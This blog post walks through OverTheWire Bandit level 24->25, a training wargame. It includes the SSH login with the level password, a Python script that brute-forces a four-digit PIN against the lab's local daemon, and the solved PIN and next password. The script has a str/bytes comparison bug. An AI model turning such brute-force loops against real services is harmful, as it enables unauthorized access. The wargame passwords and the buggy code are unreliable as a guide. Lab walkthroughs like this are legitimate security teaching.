---
layout: post
author: mike
series: bandit
categories: bandit 
---

### Level 24 -> 25
#### Game Instructions
> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

This one is our first scripting for brute force...
```
ssh -p 2220 bandit24@bandit.labs.overthewire.org
password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
We have a daemon listening on port 30002 for us to send both the previous password + a 4 digit pin. We can do this manually and take a week or so, or we can script it out to try the 10000 combinations. **Our First Brute Attack**

Here's a script:
```py
#!/usr/bin/env python3
# coding: utf-8
import sys
import socket
pincode = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
try:
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 30002))

    # Print welcome message
    welcome_msg = s.recv(2048)
    print(welcome_msg)
    # Try brute-forcing
    while pincode < 10000:
        pincode_string = str(pincode).zfill(4)
        message=password+" "+pincode_string+"\n"
        # Send message
        s.sendall(message.encode())
        receive_msg = s.recv(1024)
        # Check result
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pincode_string)
        else:
            print(receive_msg)
            break
        pincode += 1
finally:
    sys.exit(1)
```
After a while we'll get to the right combination. The pin is **2586** as of my writing.

Next password:
`uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
